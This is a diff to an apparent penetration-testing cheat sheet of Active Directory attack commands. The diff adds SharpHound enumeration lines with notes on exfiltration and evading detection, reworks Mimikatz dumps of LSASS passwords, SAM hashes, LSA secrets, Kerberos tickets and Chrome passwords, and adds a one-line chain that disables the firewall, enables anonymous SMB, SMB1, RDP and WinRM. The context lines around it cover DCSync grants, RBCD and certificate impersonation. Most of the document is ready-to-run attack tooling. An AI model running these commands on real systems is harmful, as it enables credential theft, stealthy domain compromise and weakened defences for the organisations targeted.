@@ -137,6 +137,8 @@
 ^AD Reminder:ReadGPPPassword → retrieve SYSVOL policy file and decrypt cpassword → run: gpp-decrypt <cpassword>
 ^AD Reminder:AddAllowedToAct (RBCD) → configure Resource-Based Constrained Delegation → run: impacket-rbcd -delegate-from <controlled_machine>$ -delegate-to <target_machine>$ -dc-ip <dc-ip> -action write <domain>/<user>:<password>
 ^AD Reminder:AddKey (Shadow Credentials) → inject key credential and authenticate via PKINIT → run: certipy-ad shadow auto -u <user> -p '<password>' -account <target_account> -dc-ip <dc-ip>
+^AD Reminder:If you obtain any domain user shell → run SharpHound collection early to identify privilege escalation paths in BloodHound.
+^AD Reminder:If SharpHound output exists on disk → download the ZIP/JSON files and import into BloodHound GUI for attack path analysis.
 ^AD attack notes:See https://www.netexec.wiki/getting-started/selecting-and-using-a-protocol for available nxc protocols
 
 Domain Info:nxc smb <target> # Probe SMB to fingerprint domain/workgroup and host OS; kali-machine
@@ -172,6 +174,14 @@ Kerbrute:/home/kali/Tools/kerbrute_linux_amd64 bruteuser -d <domain> --dc <dc-ip
 Kerbrute:/home/kali/Tools/kerbrute_linux_amd64 passwordspray -d <domain> --dc <dc-ip> users.txt <password> # Password spray; kali-machine
 Username Anarchy:/home/kali/Tools/username-anarchy/username-anarchy -i <wordlist1> # Generate username permutations; kali-machine
 Username Anarchy:/home/kali/Tools/username-anarchy/username-anarchy --recognise <user> # Analyze username scheme; kali-machine
+SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public -OutputPrefix bh #collect full AD enumeration dataset and save BloodHound JSON output to writable Public directory; target-machine
+SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -Domain <domain> -OutputDirectory C:\Users\Public -OutputPrefix bh #enumerate full domain data explicitly when multiple domains or trust scenarios exist; target-machine
+SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -Stealth -OutputDirectory C:\Users\Public -OutputPrefix bh #run full collection with stealth mode to reduce noisy queries against domain controllers; target-machine
+SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -ZipFile bh.zip #collect full dataset and compress output directly into ZIP for easier exfiltration; target-machine
+SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -ZipFile bh.zip -OutputDirectory C:\Users\Public #collect full dataset and store compressed BloodHound output in Public directory; target-machine
+SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -OutputPrefix bh -RandomizeFilenames #randomize output filenames to evade simple defensive detection rules; target-machine
+SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -Throttle 2000 -Jitter 30 -OutputDirectory C:\Users\Public #slow enumeration speed and add jitter to reduce detection and avoid overloading domain controllers; target-machine
+SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -ZipFile loot.zip
 BloodHound Python:bloodhound-python -d <domain> -u <user> -p <password> -dc <dc-ip> -c All # Collect all BloodHound data; kali-machine
 BloodHound Python:bloodhound-python -d <domain> -u <user> -p <password> -dc <dc-ip> -c Group,LocalAdmin,RDP,DCOM,Session # Collect specific data; kali-machine
 BloodHound Python:bloodhound-python -d <domain> -u <user> -p <password> -dc <dc-ip> -c All --zip # Collect and zip; kali-machine
@@ -196,15 +206,6 @@ Impacket Enum:impacket-GetADUsers -dc-ip <dc-ip> '<domain>/<user>:<password>' -a
 Impacket Enum:impacket-GetADUsers -dc-ip <dc-ip> -k -no-pass <domain>/ # List with Kerberos; kali-machine
 Impacket Enum:impacket-netview -dc-ip <dc-ip> <domain>/<user>:<password> # Enumerate sessions and shares; kali-machine
 Impacket Enum:impacket-smbclient -k -no-pass -dc-ip <dc-ip> <domain>/@<target> # SMB client with Kerberos; kali-machine
-NXC SMB:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --users # List domain users; kali-machine
-NXC SMB:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --groups # List domain groups; kali-machine
-NXC SMB:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --shares # List shares; kali-machine
-NXC SMB:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --loggedon-users # Find logged on users; kali-machine
-NXC SMB:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --sessions # List active sessions; kali-machine
-NXC SMB:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --disks # List disks; kali-machine
-NXC SMB:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --pass-pol # Get password policy; kali-machine
-NXC SMB:nxc smb <target> -u '<user>' -H '<ntlm>' --local-auth # Local auth with NTLM; kali-machine
-
 AS-REP Roasting # 1:impacket-GetNPUsers '<domain>/' -dc-ip <dc-ip> -usersfile <wordlist1> -no-pass -outputfile hash.txt # Test username list for users without pre-auth. If hashes returned, crack with hashcat -m 18200; kali-machine
 AS-REP Roasting # 1:impacket-GetNPUsers '<domain>/<user>' -dc-ip <dc-ip> -no-pass -outputfile hash.txt # Test single user when you have one username; kali-machine
 AS-REP Roasting # 1:nxc ldap <target> -u <userlist> -p '' --asreproast output.txt # AS-REP roast with nxc using username list; kali-machine
@@ -291,7 +292,7 @@ RBCD:impacket-addcomputer -computer-name 'ATTACKER$' -computer-pass 'Password123
 RBCD:.\Rubeus.exe rbcd /tgt:<target_computer>$ /tgs:<attacker_computer>$ /nowrap # Set RBCD on target; target-machine
 RBCD:.\Rubeus.exe s4u /user:<attacker_computer>$ /rc4:<ntlm> /impersonateuser:administrator /msdsspn:cifs/<target>.<domain> /ptt # Impersonate admin; target-machine
 ACL Abuse:Add-DomainObjectAcl -TargetIdentity <target_user> -PrincipalIdentity <user> -Rights ResetPassword -Verbose # Grant password reset rights; target-machine
-ACL Abuse:Set-DomainUserPassword -Identity <target_user> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) # Reset password with rights; target-machine
+ACL Abuse:Set-DomainUserPassword -Identity <target_user> -AccountPassword (ConvertTo-SecureString 'P@ssw0rd@123' -AsPlainText -Force) # Reset password with rights; target-machine
 ACL Abuse:Add-DomainGroupMember -Identity 'Domain Admins' -Members <user> # Add to group with write permissions; target-machine
 ACL Abuse:Add-ObjectACL -TargetDistinguishedName "DC=<domain>,DC=<tld>" -PrincipalSamAccountName <user> -Rights DCSync # Grant DCSync rights; target-machine
 GPP/cPassword:nxc smb <target> -u '<user>' -p '<password>' -M gpp_password # Find GPP passwords; kali-machine
@@ -305,13 +306,13 @@ Trust Attacks:nltest /server:<dc-ip> /trusted_domains # List trusted domains; ta
 
 AD Recon One Scream:echo [+] Domain:%USERDNSDOMAIN% && echo [+] DCs: && nltest /dclist:%USERDNSDOMAIN% && echo [+] Trusts: && nltest /domain_trusts # Quick AD context from Windows host; target-machine
 Mimikatz # 1:.\mimikatz.exe "log" "privilege::debug" "token::elevate" "lsadump::lsa /inject" "sekurlsa::logonpasswords" "exit" # Full credential dump; target-machine
-Mimikatz # 1:.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > logonpasswords.txt # Save logon passwords to file; target-machine
-Mimikatz # 1:.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam.txt # Dump SAM hashes; target-machine
-Mimikatz # 1:.\mimikatz.exe "privilege::debug" "lsadump::secrets" "exit" > secrets.txt # Dump LSA secrets; target-machine
-Mimikatz # 1:.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" # Export all Kerberos tickets; target-machine
-Mimikatz # 1:.\mimikatz.exe "privilege::debug" "lsadump::cache" "exit" # Dump domain cache; target-machine
-Mimikatz # 1:.\mimikatz.exe "privilege::debug" "vault::cred" "exit" # Dump Windows Vault; target-machine
-Mimikatz # 1:.\mimikatz.exe "privilege::debug" "dpapi::chrome" "exit" # Dump Chrome saved passwords; target-machine
+Mimikatz # 1:.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit" > logonpasswords.txt # Save logon passwords to file; target-machine
+Mimikatz # 1:.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" > sam.txt # Dump SAM hashes; target-machine
+Mimikatz # 1:.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit" > secrets.txt # Dump LSA secrets; target-machine
+Mimikatz # 1:.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::tickets /export" # Export all Kerberos tickets; target-machine
+Mimikatz # 1:.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" "exit" # Dump domain cache; target-machine
+Mimikatz # 1:.\mimikatz.exe "privilege::debug" "token::elevate" "vault::cred" "exit" # Dump Windows Vault; target-machine
+Mimikatz # 1:.\mimikatz.exe "privilege::debug" "token::elevate" "dpapi::chrome" "exit" # Dump Chrome saved passwords; target-machine
 NanoDump # 1:nxc smb <target> -u '<user>' -p '<password>' -M nanodump # Dump LSASS remotely via nxc; kali-machine
 NanoDump # 1:.\nanodump.exe -o lsass.dmp # Dump LSASS locally; target-machine
 NanoDump # 1:.\nanodump.exe -w -o lsass.dmp # Write dump to disk; target-machine
@@ -405,27 +406,27 @@ Unprivileged Password Reset:Set-DomainUserPassword -Identity <target_user> -Acco
 Unprivileged Password Reset:Set-ADAccountPassword -Identity <target_user> -Reset -NewPassword (ConvertTo-SecureString '<new_password>' -AsPlainText -Force) # Reset with AD module; target-machine
 GPO Abuse:.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy" # Modify GPO to add local admin; target-machine
 GPO Abuse:gpupdate /force # Force Group Policy update; target-machine
-Enable Everything Ultimate:reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f && reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f && reg add "HKLM\Software\Policies\Microsoft\Windows\LanmanWorkstation" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymous" /t REG_DWORD /d 0 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymousSAM" /t REG_DWORD /d 0 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "EveryoneIncludesAnonymous" /t REG_DWORD /d 1 /f && reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v AllowAutoConfig /t REG_DWORD /d 1 /f && netsh advfirewall set allprofiles state off && netsh advfirewall firewall add rule name="WinRM Public" dir=in action=allow protocol=TCP localport=5985 && winrm quickconfig -q && sc config winrm start= auto && net stop termservice && net start termservice && net stop lanmanworkstation && net start lanmanworkstation && net stop lanmanserver && net start lanmanserver && net start winrm && dism /online /norestart /enable-feature /featurename:SMB1Protocol && net localgroup "Remote Desktop Users" "<user>" /add # ULTIMATE: Enable RDP + WinRM + SMB guest + disable firewall + all services; target-machine
-Enable Everything Ultimate:reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && ^
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f && ^
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f && ^
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f && ^
-reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f && ^
-reg add "HKLM\Software\Policies\Microsoft\Windows\LanmanWorkstation" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f && ^
-reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymous" /t REG_DWORD /d 0 /f && ^
-reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymousSAM" /t REG_DWORD /d 0 /f && ^
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "EveryoneIncludesAnonymous" /t REG_DWORD /d 1 /f && ^
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v AllowAutoConfig /t REG_DWORD /d 1 /f && ^
-netsh advfirewall set allprofiles state off && ^
-netsh advfirewall firewall add rule name="WinRM Public" dir=in action=allow protocol=TCP localport=5985 && ^
-winrm quickconfig -q && ^
-sc config winrm start= auto && ^
-net stop termservice && net start termservice && ^
-net stop lanmanworkstation && net start lanmanworkstation && ^
-net stop lanmanserver && net start lanmanserver && ^
-net start winrm && ^
-dism /online /norestart /enable-feature /featurename:SMB1Protocol && ^
-net localgroup "Remote Desktop Users" "<user>" /add # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #1:reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f && reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f && reg add "HKLM\Software\Policies\Microsoft\Windows\LanmanWorkstation" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymous" /t REG_DWORD /d 0 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymousSAM" /t REG_DWORD /d 0 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "EveryoneIncludesAnonymous" /t REG_DWORD /d 1 /f && reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v AllowAutoConfig /t REG_DWORD /d 1 /f && netsh advfirewall set allprofiles state off && netsh advfirewall firewall add rule name="WinRM Public" dir=in action=allow protocol=TCP localport=5985 && winrm quickconfig -q && sc config winrm start= auto && net stop termservice && net start termservice && net stop lanmanworkstation && net start lanmanworkstation && net stop lanmanserver && net start lanmanserver && net start winrm && dism /online /norestart /enable-feature /featurename:SMB1Protocol && net localgroup "Remote Desktop Users" "<user>" /add # ULTIMATE: Enable RDP + WinRM + SMB guest + disable firewall + all services; target-machine
+Enable Everything Ultimate #2:reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:reg add "HKLM\Software\Policies\Microsoft\Windows\LanmanWorkstation" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymous" /t REG_DWORD /d 0 /f # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymousSAM" /t REG_DWORD /d 0 /f # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "EveryoneIncludesAnonymous" /t REG_DWORD /d 1 /f # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v AllowAutoConfig /t REG_DWORD /d 1 /f # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:netsh advfirewall set allprofiles state off # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:netsh advfirewall firewall add rule name="WinRM Public" dir=in action=allow protocol=TCP localport=5985 # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:winrm quickconfig -q # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:sc config winrm start= auto # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:net stop termservice && net start termservice # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:net stop lanmanworkstation && net start lanmanworkstation # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:net stop lanmanserver && net start lanmanserver # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:net start winrm # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:dism /online /norestart /enable-feature /featurename:SMB1Protocol # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+Enable Everything Ultimate #2:net localgroup "Remote Desktop Users" "<user>" /add # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
 AD CS:certipy-ad find -u '<user>' -p '<password>' -dc-ip <dc-ip> -vulnerable # enumerate AD CS certificate authorities and templates, highlighting misconfigurations and vulnerable ESC paths that may allow privilege escalation; kali-machine
 AD CS:certipy-ad find -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> # enumerate AD CS objects and certificate templates to identify enrollable templates, dangerous EKUs, weak enrollment rights, and potential abuse paths; kali-machine
 AD CS:certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca <CA_NAME> -template <VULN_TEMPLATE> -target <dc-ip> -upn administrator@<domain> # request a certificate from a vulnerable template while supplying an alternative UPN to impersonate another account such as Administrator; kali-machine
